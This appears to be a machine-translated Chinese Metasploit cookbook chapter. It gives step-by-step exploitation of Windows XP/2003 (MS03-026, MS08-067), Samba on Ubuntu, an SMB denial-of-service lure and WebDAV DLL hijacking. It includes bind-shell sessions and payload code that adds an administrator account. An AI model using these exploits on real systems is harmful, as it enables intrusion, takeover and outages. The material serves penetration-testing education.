# 第三章基于操作系统的漏洞评估与利用

在本章中，我们将介绍：

*   利用使用快速提示
*   在 Windows XP SP2 计算机上进行渗透测试
*   将 shell 绑定到目标以进行远程访问
*   Windows 2003 服务器上的渗透测试
*   Windows 7/Server 2008 R2 SMB 客户端无限循环
*   利用 Linux（Ubuntu）机器
*   了解 Windows DLL 注入缺陷

# 导言

在上一章中，我们着重于收集有关目标的信息。各种信息包括目标 IP 地址、开放端口、可用服务、操作系统等。信息收集过程中最大的资产之一是获取有关目标服务器或系统使用的操作系统的知识。事实证明，这些信息对渗透目标机器非常有帮助，因为我们可以快速查找正在使用的操作系统的漏洞和漏洞。嗯，这个过程并不像听起来那么简单，但是对目标操作系统的了解可以在很大程度上简化我们的任务。

每一种操作系统都有一些缺陷。一旦它被报告，开发利用它的过程就开始了。获得许可的操作系统（如 Windows）可以快速为缺陷或漏洞开发补丁，并将其作为更新提供给用户。漏洞披露是当今的一个大问题。许多零日披露在计算机行业造成了巨大的破坏。零日漏洞备受追捧，在地下市场，价格可能在 5 万美元至 10 万美元之间。漏洞被检测和利用，但漏洞的披露取决于研究人员及其意图。

诸如 Microsoft 和 Adobe 之类的知名产品会定期发布修补程序，但这取决于用户是否应用它们。在公司场景中，情况变得更糟，因为需要停机时间，服务器需要数周才能进行修补，以确保业务连续性不会受到影响。因此，始终建议您更新或关注在使用中的操作系统中发现的任何最新漏洞。未打补丁的系统是黑客的避风港，因为他们会立即发动攻击以破坏目标。因此，定期修补和更新操作系统至关重要。在本章中，我们将重点介绍一些最流行的操作系统中报告的漏洞。

在渗透测试过程中，一旦目标操作系统的信息可用，pen 测试人员就开始寻找针对特定操作系统缺陷的可用漏洞。因此，本章将是通过操作系统中的漏洞渗透目标的第一步。我们将重点介绍一些最广泛使用的基于家庭和企业的微软操作系统，以及一些风格的 Linux。我们还将研究如何使用漏洞利用并设置其参数，使其在目标机器上可执行。最后，但并非最不重要的是，我们将讨论 Metasploit 框架中可用的一些有用的有效负载。让我们从食谱开始。

# 利用使用快速提示

在开始在目标机器上使用漏洞利用和有效负载之前，我们首先必须了解它们的一些基本知识。了解漏洞利用的用法非常重要，这样您就可以克服由于参数配置错误而可能出现的一些常见错误。因此，让我们从使用漏洞利用的一些基础知识以及如何设置参数值开始。

## 准备好了吗

为了开始在目标上使用漏洞攻击，首先需要扫描目标上的开放端口和服务。一旦收集了足够的目标信息，下一步就是相应地选择漏洞利用。因此，让我们分析一些可以直接从 msfconsole 启动的利用命令。

## 怎么做。。。

以下是在利用漏洞期间有用的命令列表：

*   `msf > show exploits`和 `msf > show payloads:`这两个命令将在 Metasploit 目录中显示所有可用的漏洞利用和有效负载。
*   `msf > search exploit:` This command will search for a particular exploit. We can also use this command to search for any specific search terms. The command should be passed in the following manner:

    `msf > search exploit-name or search-term`

    例如，考虑以下命令：

    ```
    msf > search ms03_026_dcom
    Matching Modules
    ================
    Name Disclosure Date Rank Description
    ---- --------------- ---- -----------
    exploit/windows/
    dcerpc/ms03_026_dcom 2003-07-16 great Microsoft RPC DCOM 
    ```

*   `msf > use exploit:` This command is used to set any exploit as active and ready to use. The command is passed in the following manner:

    msf>使用漏洞名称

    执行此命令后，提示也会更改为利用漏洞类型：

    ```
    msf > use exploit/windows/dcerpc/ms03_026_dcom
    msf exploit(ms03_026_dcom) > 
    ```

*   `show options:`此命令用于查看正在使用的漏洞的可用选项或参数。各种参数包括主机 IP、端口、线程等。标记为 `yes`的参数必须有一个值才能执行该漏洞利用。

    ```
    msf exploit(ms03_026_dcom) > show options
    Module options (exploit/windows/dcerpc/ms03_026_dcom):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 135 yes The target port 
    ```

*   `set:` This command is used to set a value to a parameter in the exploit under use. It is used to set up a payload for a particular exploit in use. The command can be passed in the following manner:

    `msf > set parameter-name parameter-value`

    同样，我们也可以使用 `unset`命令：

    ```
    msf exploit(ms03_026_dcom) > set RHOST 102.168.56.102
    RHOST => 102.168.56.102
    msf exploit(ms03_026_dcom) > 
    ```

*   有名为 `setg`和 `unsetg`的可选命令。当我们必须在 `msfconsole`中全局设置参数值时，使用这些命令。因此，它避免了我们重新输入相同的值。
*   `show targets:`每次攻击都是为了攻击特定的目标服务。此命令显示有关可利用漏洞攻击的可能目标的信息：

    ```
    msf exploit(ms03_026_dcom) > show targets
    Exploit targets:
    Id Name
    -- ----
    0 Windows NT SP3-6a/2000/XP/2003 Universal 
    ```

在这里，我们可以看到 `dcom`漏洞可用于多种类型的 Windows 机器。

## 它是如何工作的。。。

在[第 1 章](01.html "Chapter 1. Metasploit Quick Tips for Security Professionals")*Metasploit 安全专业人士快速提示*中，我们讨论了整个 Metasploit 框架具有模块化架构。不同的漏洞被转换成一个框架可理解的模块，该模块可以根据它运行。调用不同的命令来加载和设置模块。 `msfconsole`的命令行界面便于访问不同的模块和进行渗透测试。

# 在 Windows XP SP2 机器上进行渗透测试

现在让我们把手伸进这个充满剥削的世界。首先，我们将研究最主要但应用最广泛的操作系统 Windows XP。在这个配方中，我们将看到如何使用 Metasploit 进入在 Windows XP 机器上运行的目标系统。我们将使用在上一个配方中学习的命令，然后继续选择漏洞利用和有效负载，并设置各种所需参数。

## 准备好了吗

我们将从 `msfconsole`开始渗透测试过程。因此，启动控制台并执行端口扫描以收集有关目标的信息。我们在上一章中详细讨论了端口扫描。在这里，我假设您已经收集了有关目标的信息，并且它正在运行 Windows XP 操作系统。因此，让我们继续选择漏洞利用和有效负载。

## 怎么做。。。

要在 Windows XP SP2 计算机上执行渗透测试，请执行以下步骤：

1.  The primary goal will be to select an exploit that can be used on a Windows XP machine. You can browse to the `/exploits/windows` directory or simply make a search for a list of available exploits for the Windows XP platform. We will be using RPC `dcom` vulnerability to penetrate our target. So let us first search for the RPC `dcom` vulnerability, using the following command:

    ```
    msf exploit(ms03_026_dcom) > search dcom
    Matching Modules
    ================
    Name Disclosure Date Rank Description
    ---- --------------- --- -----------
    exploit/windows
    dcerpc/ms03_026_dcom 2003-07-16 great Microsoft RPC
    xploit/windows/
    driver/
    broadcom_wifi_ssid 2006-11-11 low Broadcom Wireless
    xploit/windows/
    smb/ms04_031_netdde 2004-10-12 good Microsoft NetDDE 
    ```

    正如我们所看到的，搜索产生了三个结果。我们将进行第一次开发，因为它的 `rank` 被列为 `great`，所以它的成功率会更高。

2.  In order to set `exploit/windows/dcerpc/ms03_026_dcom` as the usable exploit, we will execute the following command:

    ```
    msf exploit(ms03_026_dcom) > use exploit/windows/dcerpc/ms03_026_dcom
    msf exploit(ms03_026_dcom) > 
    ```

    提示中的更改表示命令已成功执行。

3.  The next step will be to set up the various parameters of the exploit. The `show options` command will list the available parameters in the exploit. Then, by using the `set` command, we can set up the various parameters. Some parameters will have default values as well:

    ```
    msf exploit(ms03_026_dcom) > show options
    Module options (exploit/windows/dcerpc/ms03_026_dcom):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 135 yes The target port
    Exploit target:
    Id Name
    -- ----
    0 Windows NT SP3-6a/2000/XP/2003 Universal 
    ```

    此处 `RHOST`表示远程主机的 IP 地址， `RPORT`表示默认绑定端口。默认情况下， `RPORT` 的值被设置为 `135`。我们必须将 `RHOST`的值设置为我们的目标 IP 地址，以便执行攻击：

    ```
    msf exploit(ms03_026_dcom) > set RHOST 192.168.56.102
    RHOST => 192.168.56.102
    msf exploit(ms03_026_dcom) > 
    ```

    ### 注

    请注意， `ms03_026_dcom`漏洞的 ID 设置为 `0`。这意味着我们不需要指定目标上运行的是哪台 Windows 计算机。它可以利用其中列出的任何 Windows 计算机进行攻击。对于任何其他攻击，我们可能必须使用 `show targets`命令选择目标操作系统。

    现在 `RHOST`的值已设置为我们的目标 IP 地址。如果我们尝试运行该漏洞攻击，则会收到一条错误消息。原因是我们尚未选择任何有效负载进行攻击。

4.  我们的下一步将是选择一个相关的有效载荷。我们可以使用命令 `show payloads`列出所有可用的有效载荷。我们将从一个简单的 `windows/adduser`有效载荷示例开始。此有效负载将在目标操作系统中添加新用户：

    ```
    msf exploit(ms03_026_dcom) > set PAYLOAD windows/adduser
    PAYLOAD => windows/adduser 
    ```

5.  Now, if we again use the `show options` command then it will list the parameters for both the exploit, as well as the payload. The payload parameters will look something like this:

    ```
    Payload options (windows/adduser):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    EXITFUNC thread yes seh, thread, process, none
    PASS metasploit yes password for this user
    USER metasploit yes The username to create 
    ```

    我们可以看到将添加到目标操作系统的默认用户名和密码是 `metasploit`和`metasploit`。我们可以使用 `set PASS`和`set USER`命令更改这些值。

6.  Now that our payload is set, we are ready to penetrate the target machine. We will use the following command to launch the exploit:

    ```
    msf exploit(ms03_026_dcom) > exploit
    [*] Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
    [*] Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.56.102[135] ...
    [*] Bound to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.56.102[135] ...
    [*] Sending exploit ...
    [*] Exploit completed, but no session was created. 
    ```

    输出的最后一行显示攻击已在目标计算机上成功完成。现在将在目标计算机中添加一个新用户。输出还表示没有创建会话。这是因为我们使用的负载是一个简单的 `adduser`，不需要任何活动会话。因此，一旦攻击完成，与目标的连接就结束了。在下一个配方中，我们将使用有效负载来设置会话。

## 它是如何工作的。。。

RPC 中处理 TCP/IP 上消息交换的部分存在漏洞。由于错误处理格式错误的消息而导致失败。此特定漏洞影响带有 RPC 的**分布式组件对象模型（DCOM）**接口，该接口侦听启用 RPC 的端口。因此，目标计算机必须有一个运行 RPC 服务的可用端口。

此接口处理由客户端计算机发送到服务器的 DCOM 对象激活请求。成功利用此漏洞的攻击者将能够在受影响的系统上以本地系统权限运行代码。攻击者将能够对系统采取任何操作。这包括安装程序、查看/更改/删除数据或创建具有完全权限的新帐户。

有关此漏洞的详细信息，请访问 Microsoft 安全公告的以下链接：

[http://technet.microsoft.com/en-us/security/bulletin/ms03-026](http://technet.microsoft.com/en-us/security/bulletin/ms03-026)

现在为了理解 `adduser`有效载荷的工作原理，我们将分析有效载荷的 ruby 代码。让我们浏览到有效负载位置：

```
root@bt:~# cd /pentest/exploits/framework3/modules/payloads/singles/windows
root@bt:/pentest/exploits/framework3/modules/payloads/singles/windows# less adduser.rb 
```

我们感兴趣的代码的以下部分：

```
# Register command execution options
register_options(
[
OptString.new('USER', [ true, "The username to create", "metasploit" ]),
OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
], self.class)
# Hide the CMD option
deregister_options('CMD')
end
#
# Override the exec command string
#
def command_string
user = datastore['USER'] || 'metasploit'
pass = datastore['PASS'] || ''
if(pass.length > 14)
raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
end
return "cmd.exe /c net user #{user} #{pass} /ADD && " +
"net localgroup Administrators #{user} /ADD"
end

```

您可以通过添加了 `#`符号的注释来理解代码。代码很简单，不需要解释。它首先注册用户名和密码的值。然后，当有效负载被执行时，它继续隐藏 `CMD`功能，使其不会出现在目标屏幕上。然后，代码覆盖 `windows/exec`有效载荷以传递参数值，并启动一个隐藏命令提示符以在后台执行。

您可以使用代码并进行自己的更改。这将帮助您深入挖掘有效负载的世界。

# 将外壳绑定到目标进行远程访问

在前面的配方中，我们分析了如何利用 Windows SP2 机器并添加新的用户帐户。但连接在执行攻击后立即终止。在这个方法中，我们将向前迈进一步，将一个 shell 绑定到目标上，这样我们就可以与目标建立远程连接并获得对它的控制。该过程与前一配方中提到的过程类似。我们所要做的就是使用不同的有效载荷，在目标机器上为我们发射炮弹。

## 准备好了吗

我们将再次启动我们的 `msfconsole`，我们的目标与 Windows XP SP2 机器配方上的*渗透测试相同。我们将使用相同的 `dcom`漏洞，然后这次使用不同的负载将外壳绑定到目标。*

## 怎么做。。。

要将外壳绑定到目标，请执行以下步骤：

1.  我们将首先选择针对目标机器的 `dcom`攻击。我们将设置各种利用漏洞参数，然后选择有效负载：

    ```
    msf > use exploit/windows/dcerpc/ms03_026_dcom
    msf exploit(ms03_026_dcom) > show options
    Module options (exploit/windows/dcerpc/ms03_026_dcom):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 135 yes The target port
    Exploit target:
    Id Name
    -- ----
    0 Windows NT SP3-6a/2000/XP/2003 Universal
    msf exploit(ms03_026_dcom) > set RHOST 192.168.56.102
    RHOST => 192.168.56.102 
    ```

2.  现在我们的漏洞已经设置好，我们现在将转移到有效负载。使用 `show payloads`命令将列出所有可用的有效载荷。现在，我们将使用将在目标机器上的端口 `4444`（默认情况下）上打开 TCP 连接的 `windows/shell/bind_tcp`有效负载，并向我们提供一个命令 shell：

    ```
    msf exploit(ms03_026_dcom) > set PAYLOAD windows/shell/bind_tcp
    PAYLOAD => windows/shell/bind_tcp 
    ```

3.  现在：使用 `show options`命令，我们可以设置 `RHOST`等其他相关参数，并更改默认端口。设置参数后，我们将执行漏洞利用。让我们看看执行的输出是什么：

    ```
    msf exploit(ms03_026_dcom) > exploit
    [*] Started reverse handler on 192.168.56.101:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP - Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (AlwaysOn NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.56.102
    [*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:1052) at 2011-10-31 01:55:42 +0530
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.
    C:\WINDOWS\system32> 
    ```

该漏洞已成功执行，我们在 `msfconsole`中启动了一个命令提示符。现在可以使用此会话来获得对目标计算机的完全远程访问。我们可以随时使用 `exit`命令退出此会话。

您现在可能已经意识到 Metasploit 中有效负载的威力。强烈建议您尝试各种可用的有效负载，以了解其功能。

## 它是如何工作的。。。

`dcom`漏洞利用的工作原理与上一个配方中的说明相同。为了理解 `bind_tcp`的工作原理，我们需要等待一段时间，因为它涉及一些概念，我们将在本书后面的章节中讨论这些概念。尽管如此，您仍然可以通过浏览 `/pentest/exploits/framework3/modules/payloads/stagers/windows/bind_tcp.rb`来查看有效负载 ruby 代码。

## 还有更多。。。

接下来呢？shell 访问如何为我们提供对目标的控制。

### 完全控制目标

现在我们已经与目标机器建立了 shell 连接，我们可以使用命令提示符完全访问目标机器。现在，我们可以通过使用常见的 DOS 命令来探索目标机器。一些基本操作包括目录列表、复制文件和文件夹、创建用户代理等。

# 在 Windows 2003 服务器上进行渗透测试

在前面的方法中，我们分析了如何使用 `dcom`漏洞造成缓冲区溢出并利用我们的 Windows 目标进行攻击。在本食谱中，我们将关注一个相似但逻辑不同的环境。Windows 2003 服务器是 Microsoft 最广泛使用的基于企业的操作系统之一。在这个配方中，我们将看到如何利用 Windows2003 服务器。Windows 2003 服务器的更新版本已修补，因此 `dcom`漏洞在其中不起作用。因此，我们将在此配方中尝试不同的漏洞。我们将使用 `netapi32.dll`漏洞。首先，我们将分析攻击过程，然后分析此漏洞的原因。让我们开始渗透测试。

## 准备好了吗

首先，让我们启动 `msfconsole`并对目标进行快速扫描。始终建议您按照顺序执行所有步骤，以确保它加强了基础。下一步将与我们在前两个食谱中讨论的相同。唯一的区别在于使用漏洞。

## 怎么做。。。

要在 Windows 2003 服务器上执行渗透测试，请执行以下步骤：

1.  Let us start with searching for `netapi`. This will list any available exploit related to `netapi` in the Metasploit directory:

    ```
    msf > search netapi
    Matching Modules
    ================
    Name Disclosure Date Rank
    ---- --------------- ---- exploit/windows/smb/ms03_049_netapi 2003-11-11 good
    exploit/windows/smb/ms06_040_netapi 2006-08-08 good
    exploit/windows/smb/ms06_070_wkssvc 2006-11-14 manual
    exploit/windows/smb/ms08_067_netapi 2008-10-28 great 
    ```

    正如我们所看到的，在这四个结果中，最后一个漏洞的评级很高。因此，我们更愿意使用此漏洞。

2.  We will set up `RHOST` as our target Windows 2003 Server:

    ```
    msf > use exploit/windows/smb/ms08_067_netapi
    msf exploit(ms08_067_netapi) > show options
    Module options (exploit/windows/smb/ms08_067_netapi):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 445 yes Set the SMB service port
    SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
    Exploit target:
    Id Name
    -- ----
    0 Automatic Targeting
    msf exploit(ms08_067_netapi) > set RHOST 192.168.56.102
    RHOST => 192.168.56.102 
    ```

    同样， `Id`值 `0`表明我们不需要指定目标操作系统。

3.  Once we have completed the exploit loading the process, the next step will be to set up the payload. We will again set up a `tcp_bind` shell on the target machine, as we discussed earlier.

    ```
    msf exploit(ms08_067_netapi) > set payload
    windows/shell/bind_tcp
    payload => windows/shell/bind_tcp
    msf exploit(ms08_067_netapi) > set LHOST 192.168.56.101
    LHOST => 192.168.56.101 
    ```

    现在，我们的漏洞和有效载荷已经准备好了。下一步也是最后一步是使用 `exploit`命令。让我们分析一下执行结果：

    ```
    msf exploit(ms08_067_netapi) > exploit
    [*] Started bind handler
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows 2003 SERVER - Service Pack 2 - lang:English
    [*] Selected Target: Windows 2003 Server SP2 English (AlwaysOn NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (240 bytes) to 192.168.56.102
    [*] Command shell session 1 opened (192.168.56.101:43408 -> 192.168.56.102:4444) at 2011-11-02 21:25:30 +0530
    C:\WINDOWS\system32> 
    ```

答对 了我们与目标有一个外壳连接。这使我们可以通过命令行访问目标机器。您可以看到 Metasploit 对于穿透目标机器是多么强大。它确实在更大程度上简化了我们的任务。让我们快速查看一下我们在这个配方中使用的漏洞。

## 它是如何工作的。。。

此模块通过服务器服务利用路径规范化代码 `netapi32.dll`中的解析漏洞。此模块能够绕过某些操作系统和 service Pack 上的 NX。必须使用正确的目标来防止服务器服务（以及同一进程中的十几个其他服务）崩溃。

# Windows 7/Server 2008 R2 SMB 客户端无限循环

针对 Windows 7 和 Windows Server 2008 的漏洞攻击非常少。SMB 客户端无限循环就是导致系统崩溃的漏洞之一。此漏洞不会提供任何会话或 shell 连接，但值得讨论。我们将在*了解 Windows DLL 注入缺陷*配方中处理 Windows 7 中的 DLL 注入缺陷。

Microsoft Windows Server 2008 R2 和 Windows 7 内核中的 SMB 客户端允许远程 SMB 服务器和中间人攻击者通过 SMBv1 或 SMBv2 响应数据包造成拒绝服务（无限循环和系统挂起）。该数据包在 NetBIOS 标头中包含不正确的长度值，或者在该响应数据包的末尾包含额外的长度字段。此不正确的标头值是该漏洞的主要原因。

## 准备好了吗

Metasploit 包含一个辅助模块 `auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop`，可用于攻击 SMB 服务器并导致拒绝服务。攻击向量通过将 UNC 路径传递到网页并请求用户执行它来工作。一旦用户打开共享文件，系统将完全崩溃，目标将被迫重新启动。

## 怎么做。。。

要开始使用这个辅助模块，我们必须执行 `use`命令以及模块的路径。然后，我们将继续设置所需的参数并执行模块。让我们继续实际实施这些步骤：

```
msf > use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop
msf auxiliary(ms10_006_negotiate_response_loop) > show options
Module options (auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop):
Name Current Setting Required Description
---- --------------- -------- -----------
SRVHOST 0.0.0.0 yes The local host..
SRVPORT 445 yes The SMB port to listen
SSL false no Negotiate SSL..
SSLCert no Path to a custom SSL
SSLVersion SSL3 no Specify the version.. 
```

让我们快速设置各种参数。要查找的唯一参数是 `SRVHOST`，即本地主机 IP 地址或渗透测试仪 IP 地址。

```
msf auxiliary(ms10_006_negotiate_response_loop) > set SRVHOST 192.168.56.101
SRVHOST => 192.168.56.101 
```

## 它是如何工作的。。。

我们将使用 `run`命令执行辅助模块。一旦模块执行，它将生成一个共享文件夹链接，该链接必须发送到目标。在这种情况下，生成的链接是 `\\192.168.56.101\Shared\Anything`。

```
msf auxiliary(ms10_006_negotiate_response_loop) > run
[*] Starting the malicious SMB service...
[*] To trigger, the vulnerable client should try to access: \\192.168.56.101\Shared\Anything
[*] Server started. 
```

现在，我们可以制作一个网页，将此链接附加到网页上，然后将其发送给目标用户，从而使链接看起来不那么可疑。一旦目标单击此链接，系统将完全冻结并导致完全拒绝服务，从而导致重新启动系统。

# 利用 Linux（Ubuntu）机器

Linux 也是继 Windows 之后广泛使用的操作系统之一。在前面的几篇文章中，我们看到了如何利用可用服务中的关键缺陷来渗透 Windows 机器。在本食谱中，我们将讨论 Linux 操作系统。我们将在这个配方中使用 Ubuntu9.0，但这个过程将类似于利用运行 Samba 服务的 Linux 和 Solaris 的任何风格。让我们继续做这个食谱吧。

## 准备好了吗

我们将首先扫描目标 Linux 机器，以收集有关可用服务的信息。让我们快速执行 Nmap 扫描并分析其结果：

```
msf > nmap -sT 192.168.56.101
[*] exec: nmap 192.168.56.101
Starting Nmap 5.20 ( http://nmap.org ) at 2011-11-05 13:35 IST
Warning: Traceroute does not support idle or connect scan, disabling...
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.2.3 ((Ubuntu) PHP/5.2.1)
|_html-title: Index of /
139/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
445/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ) 
```

现在我们已经收集了有关目标的信息。我们的下一步将是为它选择一个漏洞和一个合适的负载。

## 怎么做。。。

渗透 Linux 机器的过程类似于 Windows。遵循以下步骤：

1.  我们所要关注的就是选择正确的漏洞和有效负载。让我们搜索 Metasploit 目录中可用的任何 Samba 漏洞：

    ```
    msf > search Samba 
    ```

2.  该命令将为 Samba 提供各种辅助设备和利用模块的列表。我们将使用 `exploit/linux/samba/lsa_transnames_heap`模块，该模块被列为良好的等级利用。因此，它将具有更高的攻击目标的概率。让我们将漏洞利用设置为活动并设置参数。

    ```
    msf > use exploit/linux/samba/lsa_transnames_heap
    msf exploit(lsa_transnames_heap) > show options
    Module options (exploit/linux/samba/lsa_transnames_heap):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST yes The target address
    RPORT 445 yes Set the SMB service port
    SMBPIPE LSARPC yes The pipe name to use
    Exploit target:
    Id Name
    -- ----
    0 Linux vsyscall
    msf exploit(lsa_transnames_heap) > set RHOST 192.168.56.101
    RHOST => 192.168.56.101
    msf exploit(lsa_transnames_heap) > 
    ```

3.  现在我们的下一个任务是选择有效载荷。我们必须记住一件事，当我们瞄准一台 Linux 机器时，我们必须为我们的渗透过程选择一个 Linux 负载。我们将使用 `linux/x86/shell_bind_tcp`有效载荷，其工作原理与我们在之前的 Windows 配方中分析的 `bind_tcp`有效载荷类似。

    ```
    msf exploit(lsa_transnames_heap) > set payload linux/x86/shell_bind_tcp
    payload => linux/x86/shell_bind_tcp
    msf exploit(lsa_transnames_heap) > show options
    Module options (exploit/linux/samba/lsa_transnames_heap):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    RHOST 192.168.56.101 yes The target address
    RPORT 445 yes Set the SMB service port
    SMBPIPE LSARPC yes The pipe name to use
    Payload options (linux/x86/shell_bind_tcp):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    LPORT 4444 yes The listen port
    RHOST 192.168.56.101 no The target address 
    ```

4.  我们现在都准备好了，我们的最后一步将是提供剥削命令来开始剥削过程：

    ```
    msf exploit(lsa_transnames_heap) > exploit
    [*] Started bind handler
    [*] Creating nop sled....
    [*] Trying to exploit Samba with address 0xffffe410...
    [*] Connecting to the SMB service... 
    ```

成功执行该漏洞利用后，我们将获得与目标机器的 shell 连接。这个过程与我们在前面的食谱中讨论的过程非常相似。唯一的区别在于选择漏洞利用和有效负载。您尝试的漏洞利用和有效负载组合越多，您对它的理解就会越好。

## 它是如何工作的。。。

让我们快速浏览一下有关该服务、其利用情况和工作情况的说明。Samba 用于 Linux 和 Windows 机器之间的打印机和文件共享。此模块在 Samba 守护程序的 LSA RPC 服务中触发堆溢出。此模块使用 talloc 区块覆盖方法（credit Ramon 和 Adriano），该方法仅适用于 Samba 版本 3.0.21-3.0.24。该漏洞利用堆中的动态内存分配。有可能在第一次尝试时利用此漏洞无法成功，因此您可以尝试多次以获得成功。

## 还有更多。。。

让我们介绍一些与 Linux 操作系统相关的模块。

### 其他针对 Linux 的相关漏洞模块

除了本配方中讨论的利用模块外，还有两个模块值得注意。强烈建议您手动尝试这些漏洞利用，以深入了解它们。它们是：

*   **Samba chain_reply Memory corrupt:**此漏洞通过破坏 3.3.13 之前的 Samba 版本中分配给响应数据包的内存而起作用。通过传递大于目标缓冲区大小的值，内存崩溃。
*   **Samba trans2open 溢出：**这是 Samba 版本 2.2.0 至 2.2.8 中存在的缓冲区溢出漏洞。它通过在未设置 `noexec`堆栈选项的 x86 Linux 机器上利用该漏洞工作。

# 了解 Windows DLL 注入缺陷

在此配方中，我们将处理 Windows 操作系统中不直接存在的一种特殊类型的漏洞。事实上，它存在于运行在 Windows 上的各种应用软件中。这个远程攻击向量处理一类影响应用程序加载外部库的漏洞。我们将对这一问题进行监督，以便仔细分析。

## 准备好了吗

这个攻击向量涉及创建一个脆弱的路径或目录，目标必须执行以触发它。目录可以是文件、解压缩存档、USB 驱动器、网络共享等。创建的文件将完全无害，但它将执行 DLL 注入代码以危害系统。

## 怎么做。。。

让我们分析一个 DLL 注入的实际实现。在本例中，我们的目标机器是未修补的 Windows 7 Ultimate 机器。该过程通过创建一个链接来共享目标必须访问和执行的文件。在我们前进的过程中，您将了解这一过程。

1.  We will be using the `exploit/windows/browser/webdav_dll_hijacker` module as an exploit and `windows/meterpreter/bind_tcp` as the payload. Let us quickly set up the exploit and payload along with other required parameters:

    ```
    msf > use exploit/windows/browser/webdav_dll_hijacker
    msf exploit(webdav_dll_hijacker) > set payload windows/meterpreter/bind_tcp
    payload => windows/meterpreter/bind_tcp
    msf exploit(webdav_dll_hijacker) > show options
    Module options (exploit/windows/browser/webdav_dll_hijacker):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    BASENAME policy yes The base name for the listed
    EXTENSIONS txt yes The list of extensions
    SHARENAME documents yes The name of the top-level
    SRVHOST 0.0.0.0 yes The local host...
    SRVPORT 80 yes The daemon port to listen
    SSLCert no Path to a custom SSL..
    URIPATH / yes The URI to use
    Payload options (windows/meterpreter/bind_tcp):
    Name Current Setting Required Description
    ---- --------------- -------- -----------
    EXITFUNC process yes Exit technique: seh..
    LPORT 4444 yes The listen port
    RHOST 192.168.56.102 no The target address
    Exploit target:
    Id Name
    -- ----
    0 Automatic 
    ```

    利用漏洞的各种参数将有助于创建特定文件和顶级共享。 `BASENAME`参数包含要创建的文件的名称。 `EXTENSIONS`是要创建的文件类型。`SHARENAME`是为访问而创建的顶级共享目录。 `SRVHOST`为本地监听端口， `SRVPORT`为 `SRVHOST`监听连接的端口号。

2.  设置了漏洞利用和有效负载的相应参数后，下一步是执行漏洞利用。让我们看看执行时会发生什么：

    ```
    msf exploit(webdav_dll_hijacker) > exploit
    [*] Exploit running as background job.
    [*] Started bind handler
    [*]
    [*] Exploit links are now available at
    \\192.168.56.101\documents\ 
    ```

3.  Once the exploit executes successfully, it starts listening for a connection and also provides a shared link that the target will have to open in order to trigger the exploit. Let us switch to the target screen to see what happens:

    ![How to do it...](graphics/7423_03_01.jpg)

    目标将查看攻击者共享的简单文件 `policy.txt`。这个文件是完全无害的。一旦用户执行此文件，就会与攻击者的机器建立连接，并建立外壳连接。一旦文件在目标上执行，DLL 将执行，您将在 `msfconsole`屏幕上看到大量活动。一旦 DLL 注入成功，我们将拥有 shell 连接（参见以下屏幕截图）：

    ![How to do it...](graphics/7423_03_02.jpg)

## 它是如何工作的。。。

让我们找出造成这种脆弱性的原因。**动态链接库（DLL）**是微软为 Windows 实现的共享库概念。DLL 是在运行时与程序关联以加载与其链接的共享库的可执行文件。当应用程序运行时， `loadlibrary()`函数在运行时加载所需的 DLL。如果未指定要加载的 DLL 的位置，或者应用程序提供的库路径不够合格，Windows 将使用自己定义的一组顺序进行搜索。此默认顺序中的一个位置是当前工作目录。

现在，当目标用户访问共享位置时，它会到达攻击者控制的区域。怎样共享文件（`policy.txt`）包含一个不太合格的 DLL 路径，因此当目标用户执行它时，Windows 开始自己搜索丢失的 DLL。现在，由于当前工作目录（`/documents`由攻击者控制，他/她可以在其中添加 Windows 将执行的恶意 DLL 代码（因为当前工作目录是 Windows 查找库的默认位置之一）。现在，这个恶意 DLL 可以让攻击者执行外部脚本。因此，有效负载现在开始工作，并建立一个外壳连接，使攻击者能够完全访问目标系统。这就是整个攻击向量的制作方法。

## 还有更多。。。

我们可以使用 H.D.Moore 开发的简单工具来寻找 DLL 注入。让我们快速地了解一下。

### H.D.摩尔的 DllHijackAudit 工具包

Metasploit 的创建者 H.D.Moore 创建了此安全审计工具，可用于在您自己的环境中执行 DLL 注入缺陷测试。它利用了流程监控实用程序和 Ruby 解释器。它的工作原理是监视是否在相关文件的工作目录中访问了 DLL。它还生成测试报告。工具和详细文档可在[中找到 http://blog.metasploit.com/2010/08/better-faster-stronger.html](http://blog.metasploit.com/2010/08/better-faster-stronger.html) 。